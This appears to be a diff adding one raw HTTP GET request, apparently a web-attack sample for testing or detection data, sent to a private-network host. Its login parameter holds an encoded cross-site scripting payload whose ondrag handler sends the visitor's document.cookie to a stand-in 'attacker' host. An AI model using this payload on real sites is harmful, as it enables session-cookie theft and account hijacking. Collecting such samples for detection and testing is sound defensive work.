@@ -1,0 +1,7 @@
+GET /?login87f194=%26lt%3Bp+draggable%3D%26%23x27%3Btrue%26%23x27%3B+ondrag%3D%26%23x27%3Blet+test%3Ddocument%3Blocation%3D%26quot%3Bhttp%3A%2F%2Fattacker%3Fcookie%3D%26quot%3B.concat%28test.cookie%29%26%23x27%3B%26gt%3BDrag+this+text%26lt%3B%2Fp%26gt%3B&password1=1&enter=%25D0%259E%25D1%2582%25D0%25BF%25D1%2580%25D0%25B0%25D0%25B2%25D0%25B8%25D1%2582%25D1%258C%2B%25D0%25B7%25D0%25B0%25D0%25BF%25D1%2580%25D0%25BE%25D1%2581 HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
